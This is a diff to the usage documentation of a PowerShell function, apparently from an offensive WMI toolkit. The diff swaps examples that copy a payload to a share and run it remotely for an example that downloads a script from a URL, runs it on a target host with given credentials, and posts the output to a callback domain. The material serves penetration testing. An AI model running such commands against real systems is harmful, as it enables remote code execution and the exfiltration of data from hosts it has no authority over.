@@ -631,12 +631,8 @@ function Invoke-RemoteScriptWithOutput
     The IP or domain to post the results back to.
 
     .EXAMPLE
-    > Invoke-RemoteScriptWithOutput -User Chris -Pass password -Targets win7workstation -SharePath C:\Users\test1\Desktop\test -PayloadPath C:\runme.exe
-    This command will copy runme.exe into the sharepath provided, setup a share and modify permissions so the runme.exe can be executed remotely.  The function then uses WMI to net use the share with the credentials provided and then run the runme.exe file.  Upon execution, the file copied into the share is deleted and the share is removed.
-
-    .Example
-    > Invoke-RemoteScriptWithOutput -Targets win7workstation -SharePath C:\Users\test1\Desktop\apple -PayloadPath C:\run.bat
-    This command will copy runme.exe into the sharepath provided, setup a share and modify permissions so the runme.exe can be executed remotely.  The function then uses WMI to net use the share within the context of the current user and then run the runme.exe file.  Upon execution, the file copied into the share is deleted and the share is removed.
+    > Invoke-RemoteScriptWithOutput -User Chris -Pass password -Targets win7workstation -Url https://raw.githubusercontent.com/ChrisTruncer/WMIOps/master/WMIOps.ps1 -Function Invoke-ExecCommandWMI -CallbackSite www.callbackdomain.com
+    This command downloads the WMIOps powershell script, runs the invoke-execcommandwmi function, and posts the output back to the specified domain (where the python server is running)
 
     .LINK
     http://blogs.technet.com/b/heyscriptingguy/archive/2009/12/10/hey-scripting-guy-december-10-2009.aspx
